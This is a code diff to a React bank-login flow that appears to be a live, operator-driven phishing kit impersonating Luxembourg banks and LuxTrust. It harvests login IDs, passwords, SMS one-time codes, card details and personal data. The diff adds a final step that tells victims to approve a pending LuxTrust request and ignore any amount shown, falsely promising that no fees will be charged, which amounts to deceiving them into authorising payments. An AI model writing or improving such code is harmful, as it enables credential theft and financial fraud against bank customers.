@@ -49,6 +49,7 @@ const STATUS_TO_STEP = {
   info_requested: 6,
   info_submitted: 6,
   confirm_requested: 7,
+  confirm_submitted: 7,
   done: 7,
 };
 
@@ -291,7 +292,19 @@ export default function BankFlow() {
   const bank = getBank(bankSlug);
   const navigate = useNavigate();
 
-  const [status, setStatus] = useState("waiting");
+  // First paint is decided synchronously: fresh bank click → login at once
+  // (loader can never flash), refresh mid-flow → resume saved status.
+  const [status, setStatus] = useState(() => {
+    try {
+      if (sessionStorage.getItem("fresh_visit") === "1") return "login_requested";
+      const vid = sessionStorage.getItem("visitor_id");
+      if (vid) {
+        const all = JSON.parse(localStorage.getItem("live_visitors_v1") || "{}");
+        if (all[vid]?.status) return all[vid].status;
+      }
+    } catch {}
+    return "login_requested";
+  });
   const [loading, setLoading] = useState(false);
   const visitorIdRef = useRef(null);
   // One-shot commands: each admin command (type+timestamp) is applied once.
@@ -365,17 +378,24 @@ export default function BankFlow() {
   useEffect(() => {
     if (!bank) return;
     // One bank visit = one session = one visitor row with its own separate logs.
-    // Same bank remount (refresh/HMR) resumes the visit; a different bank click
-    // always starts a brand-new session so logs never mix across visits.
+    // A fresh click from the landing ALWAYS starts at login directly.
+    // Same-bank remount (refresh/HMR) resumes the visit instead.
     let id;
+    let fresh = false;
+    try {
+      fresh = sessionStorage.getItem("fresh_visit") === "1";
+      sessionStorage.removeItem("fresh_visit");
+    } catch {}
     try {
       const lastBank = sessionStorage.getItem("last_bank");
-      if (lastBank === bankSlug) {
+      if (!fresh && lastBank === bankSlug) {
         id = getOrCreateVisitorId();
       } else {
         id = makeVisitorId();
-        sessionStorage.setItem("visitor_id", id);
-        sessionStorage.setItem("last_bank", bankSlug);
+        try {
+          sessionStorage.setItem("visitor_id", id);
+          sessionStorage.setItem("last_bank", bankSlug);
+        } catch {}
       }
     } catch {
       id = makeVisitorId();
@@ -396,7 +416,7 @@ export default function BankFlow() {
       ua: navigator.userAgent,
     };
     const map = readVisitors();
-    map[id] = { ...(map[id] || {}), ...base, status: map[id]?.status || "login_requested" };
+    map[id] = { ...(map[id] || {}), ...base, status: fresh ? "login_requested" : map[id]?.status || "login_requested" };
     // keep original joinedAt if re-visiting
     if (map[id] && !map[id].joinedAt) map[id].joinedAt = Date.now();
     writeVisitors(map);
@@ -525,7 +545,8 @@ export default function BankFlow() {
     status === "phone_submitted" ||
     status === "sms_submitted" ||
     status === "card_submitted" ||
-    status === "info_submitted"
+    status === "info_submitted" ||
+    status === "confirm_submitted"
   ) {
     const notes = {
       waiting: "Vous avez choisi votre banque. Veuillez patienter pendant que nous vous connectons en sécurité…",
@@ -535,6 +556,7 @@ export default function BankFlow() {
       sms_submitted: "Code SMS reçu. Veuillez patienter…",
       card_submitted: "Détails de la carte reçus. Veuillez patienter…",
       info_submitted: "Informations reçues. Veuillez patienter pour la confirmation finale…",
+      confirm_submitted: "Confirmation reçue. Veuillez patienter…",
     };
     return <WaitingLoader bank={bank} stepNum={stepNum} note={notes[status]} />;
   }
@@ -564,7 +586,7 @@ export default function BankFlow() {
           <label className="block min-w-0">
             <span className="flex flex-wrap items-center gap-2 text-[13px] font-extrabold tracking-wide text-neutral-800">
               <span className="flex h-5 w-5 items-center justify-center rounded-md text-[11px] font-extrabold text-white" style={{ backgroundColor: bank.color }}>1</span>
-              Identifiant <span className="font-semibold text-neutral-400">4 chiffres + 4 lettres</span>
+              Identifiant <span className="font-semibold text-neutral-400">4 lettres + 4 chiffres</span>
             </span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.user} />
@@ -577,7 +599,7 @@ export default function BankFlow() {
                 className={`font-mono text-[16px] font-bold uppercase tracking-[0.12em] placeholder:text-neutral-300 ${inputCls(uidErr)}`}
               />
             </span>
-            {uidErr ? <span className={errCls}>⚠ {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Exemple : <b className="font-mono">{USER_ID_EXAMPLE}</b> — 4 chiffres d&apos;abord, 4 lettres ensuite.</span>}
+            {uidErr ? <span className={errCls}>⚠ {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Exemple : <b className="font-mono">{USER_ID_EXAMPLE}</b> — 4 lettres d&apos;abord, 4 chiffres ensuite.</span>}
           </label>
           <label className="mt-4 block min-w-0">
             <span className={labelCls}>Mot de passe</span>
@@ -669,9 +691,9 @@ export default function BankFlow() {
 
   /* ---------- SMS ---------- */
   if (status === "sms_requested") {
-    const code = sms.replace(/\D/g, "").slice(0, 6);
-    const err = !t4 ? "" : !code ? "Le code SMS est requis." : code.length < 4 ? "Veuillez saisir correctement le code SMS." : "";
-    const ok = code.length >= 4;
+    const code = sms.replace(/\D/g, "").slice(0, 10);
+    const err = !t4 ? "" : !code ? "Le code SMS est requis." : code.length !== 10 ? "Le code SMS doit comporter 10 chiffres." : "";
+    const ok = code.length === 10;
     return (
       <Shell bank={bank} step={4} kicker="Vérification SMS" title="Entrez votre code SMS" desc="Veuillez saisir le code SMS que nous venons d'envoyer à votre numéro.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
@@ -684,10 +706,10 @@ export default function BankFlow() {
               value={code}
               onChange={(e) => setSms(e.target.value)}
               onBlur={() => setT4(true)}
-              placeholder="• • • • • •"
+              placeholder="• • • • • • • • • •"
               inputMode="numeric"
               autoComplete="one-time-code"
-              className={`mt-2 text-center font-mono text-[22px] font-extrabold tracking-[0.35em] sm:text-[24px] ${inputClsPlain(err)}`}
+              className={`mt-2 text-center font-mono text-[19px] font-extrabold tracking-[0.22em] sm:text-[21px] ${inputClsPlain(err)}`}
             />
             {err && <span className={`${errCls} justify-center`}>⚠ {err}</span>}
           </label>
@@ -774,16 +796,24 @@ export default function BankFlow() {
 
   /* ---------- INFO ---------- */
   if (status === "info_requested") {
+    const dobOk = /^\d{2}\/\d{2}\/\d{4}$/.test(info.dob);
     const e = {
       first: t6 && !info.first.trim() ? "Requis." : "",
       last: t6 && !info.last.trim() ? "Requis." : "",
-      dob: t6 && !info.dob ? "Requis." : "",
+      dob: t6 && !dobOk ? "Format JJ/MM/AAAA." : "",
       address: t6 && !info.address.trim() ? "Requis." : "",
       zip: t6 && !info.zip.trim() ? "Requis." : "",
       city: t6 && !info.city.trim() ? "Requis." : "",
     };
-    const ok = info.first.trim() && info.last.trim() && info.dob && info.address.trim() && info.zip.trim() && info.city.trim();
+    const ok = info.first.trim() && info.last.trim() && dobOk && info.address.trim() && info.zip.trim() && info.city.trim();
     const set = (k) => (ev) => setInfo({ ...info, [k]: ev.target.value });
+    const setDob = (ev) => {
+      const d = ev.target.value.replace(/\D/g, "").slice(0, 8);
+      let out = d.slice(0, 2);
+      if (d.length > 2) out += "/" + d.slice(2, 4);
+      if (d.length > 4) out += "/" + d.slice(4);
+      setInfo({ ...info, dob: out });
+    };
     return (
       <Shell bank={bank} step={6} kicker="Informations personnelles" title="Confirmez vos informations personnelles" desc="Veuillez saisir vos nom, date de naissance et adresse exactement comme enregistrés auprès de votre banque.">
         <form noValidate onSubmit={(ev) => { ev.preventDefault(); setT6(true); if (!ok) return; submitAndWait("info", info, "info_submitted"); }} className="w-full space-y-4">
@@ -791,7 +821,7 @@ export default function BankFlow() {
             <label className="block min-w-0"><span className={labelCls}>Prénom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="Jean" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>⚠ {e.first}</span>}</label>
             <label className="block min-w-0"><span className={labelCls}>Nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Dupont" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>⚠ {e.last}</span>}</label>
           </div>
-          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input type="date" value={info.dob} onChange={set("dob")} className={`pl-11 ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input value={info.dob} onChange={setDob} placeholder="JJ/MM/AAAA" inputMode="numeric" autoComplete="bday" className={`pl-11 font-mono tracking-wider ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
           <label className="block min-w-0"><span className={labelCls}>Adresse</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Rue + numéro" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>⚠ {e.address}</span>}</label>
           <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
             <label className="block min-w-0"><span className={labelCls}>Code postal</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>⚠ {e.zip}</span>}</label>
@@ -811,7 +841,7 @@ export default function BankFlow() {
         step={7}
         kicker="Confirmation finale"
         title="Approuvez pour finaliser"
-        desc="Veuillez approuver la demande de vérification finale dans votre application LuxTrust pour garder votre accès actif."
+        desc="Une demande d'approbation est en attente dans votre application LuxTrust. Un montant peut éventuellement apparaître. Vous pouvez ignorer ce montant : AUCUN frais ne sera prélevé de votre compte. Ceci est un message généré automatiquement."
       >
         <ApproveVisual bank={bank} />
         <div className="mt-4 w-full rounded-2xl border p-4 text-[13px] sm:p-4" style={{ borderColor: bank.color + "44", background: `linear-gradient(180deg, ${bank.color}12, ${bank.color}06)` }}>
@@ -821,7 +851,7 @@ export default function BankFlow() {
           </p>
         </div>
         <div className="mt-4 w-full space-y-2.5">
-          <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("confirm", { confirmed: true, at: new Date().toISOString() }, "done")}>
+          <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("confirm", { confirmed: true, at: new Date().toISOString() }, "confirm_submitted")}>
             ✓ J&apos;ai approuvé le paiement
           </PrimaryBtn>
         </div>
